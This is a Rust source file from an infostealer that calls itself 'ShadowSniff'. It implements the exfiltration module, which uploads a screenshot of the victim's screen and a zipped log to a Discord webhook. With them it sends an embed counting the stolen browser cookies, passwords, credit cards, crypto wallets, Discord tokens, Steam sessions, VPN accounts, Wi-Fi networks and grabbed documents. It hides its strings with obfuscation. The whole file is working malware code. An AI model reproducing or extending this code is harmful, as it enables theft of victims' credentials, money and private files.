use crate::{ExternalLink, LogContent, LogFile, LogSender, SendError};
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::{format, vec};
use collector::{Browser, Collector, Device, FileGrabber, Software, Vpn};
use derive_new::new;
use indoc::formatdoc;
use obfstr::obfstr as s;
use requests::{
    write_file_field, write_text_field, BodyRequestBuilder, MultipartBuilder, Request,
    RequestBuilder,
};
use utils::format_size;

/// A log sender that transmits data to a Discord channel using a webhook.
///
/// `DiscordWebhookSender` uses Discord's webhook API to send embedded messages
/// and files such as screenshots or zipped logs. It supports formatting logs
/// with rich embeds and fallbacks for size constraints.
///
/// # Fields
///
/// - `webhook`: The full Discord webhook URL, including the webhook ID and token.
///
/// # Notes
///
/// - Discord has a file upload limit of 8 MB per file.
#[derive(Clone, new)]
pub struct DiscordWebhookSender {
    webhook: Arc<str>,
}

fn generate_embed<P, C>(log: &LogContent, password: Option<P>, collector: &C) -> String
where
    P: AsRef<str>,
    C: Collector,
{
    let link = match log {
        LogContent::ExternalLink(ExternalLink {
            service_name,
            link,
            size,
        }) => Some(format!(
            r#"[Download from {service_name} [{size}]]({link})"#,
            size = format_size(*size as _)
        )),
        _ => None,
    };

    let password = password.map(|password| {
        let password = password.as_ref();
        format!(r#"Password: ||{password}||"#)
    });

    let mut parts = vec![];
    if let Some(l) = link {
        parts.push(l);
    }
    if let Some(p) = password {
        parts.push(p);
    }
    let description = if parts.is_empty() {
        "".to_string()
    } else {
        parts.join("\\n")
    };

    formatdoc! {
        r#"
        {{
          "title": "New log",
          "description": "{description}",
          "color": 14627378,
          "fields": [
            {{
              "name": "Browser",
              "value": "```\nCookies: {cookies}\nPasswords: {passwords}\nCredit cards: {credit_cards}\nAuto fills: {auto_fills}\nHistory: {history}\nBookmarks: {bookmarks}\nDownloads: {downloads}\n```",
              "inline": true
            }},
            {{
              "name": "Software",
              "value": "```\nWallets: {wallets}\nFtp hosts: {ftp_hosts}\nTelegram: {telegram}\nDiscord tokens: {discord_tokens}\nSteam sessions: {steam_sessions}\n```",
              "inline": true
            }},
            {{
              "name": "Files",
              "value": "```\nSource code: {source_code}\nDatabase: {databases}\nDocuments: {documents}\n```"
            }},
            {{
              "name": "Vpn",
              "value": "```\nAccounts: {vpn_accounts}\n```"
            }},
            {{
              "name": "Device",
              "value": "```\nWifi networks: {wifi_networks}\n```"
            }}
          ],
          "author": {{
            "name": "ShadowSniff"
          }},
          "footer": {{
            "text": "ShadowSniff"
          }}
        }}"#,
        cookies = collector.get_browser().get_cookies(),
        passwords = collector.get_browser().get_passwords(),
        credit_cards = collector.get_browser().get_credit_cards(),
        auto_fills = collector.get_browser().get_auto_fills(),
        history = collector.get_browser().get_history(),
        bookmarks = collector.get_browser().get_bookmarks(),
        downloads = collector.get_browser().get_downloads(),

        wallets = collector.get_software().get_wallets(),
        ftp_hosts = collector.get_software().get_ftp_hosts(),
        telegram = collector.get_software().is_telegram(),
        discord_tokens = collector.get_software().get_discord_tokens(),
        steam_sessions = collector.get_software().get_steam_session(),

        source_code = collector.get_file_grabber().get_source_code_files(),
        databases = collector.get_file_grabber().get_database_files(),
        documents = collector.get_file_grabber().get_documents(),

        vpn_accounts = collector.get_vpn().get_accounts(),

        wifi_networks = collector.get_device().get_wifi_networks()
    }
}

impl DiscordWebhookSender {
    fn send_multipart(&self, builder: MultipartBuilder) -> Result<(), SendError> {
        let content_type = builder.content_type();
        let body = builder.finish();

        Request::post(self.webhook.to_string())
            .header(s!("Content-Type"), &content_type)
            .body(body)
            .build()
            .send()
            .ok()
            .ok_or(SendError::Network)?;

        Ok(())
    }
}

impl LogSender for DiscordWebhookSender {
    fn send<P, C>(
        &self,
        log_file: LogFile,
        password: Option<P>,
        collector: &C,
    ) -> Result<(), SendError>
    where
        P: AsRef<str> + Clone,
        C: Collector,
    {
        if let LogContent::ZipArchive(archive) = &log_file.content
            && archive.len() >= 8 * 1024 * 1024
        // 8 MB
        {
            return Err(SendError::LogFileTooBig);
        }

        if let Some(screenshot) = collector.get_device().get_screenshot() {
            let mut builder = MultipartBuilder::new("----Multipart");
            write_file_field!(builder, "file", "screenshot.png", "image/png", &screenshot);
            write_text_field!(builder, "payload_json", r#"{"content": ""}"#);
            self.send_multipart(builder)?;
        }

        let payload = formatdoc! {
            r#"{{
                "content": "",
                "embeds": [
                    {embed}
                ]
            }}"#,
            embed = generate_embed(&log_file.content, password, collector),
        };

        let mut builder = MultipartBuilder::new("----Multipart");
        if let LogContent::ZipArchive(archive) = log_file.content {
            write_file_field!(builder, "file", &log_file.name => "application/zip", &archive);
        }

        write_text_field!(builder, "payload_json" => &payload);
        self.send_multipart(builder)?;

        Ok(())
    }
}
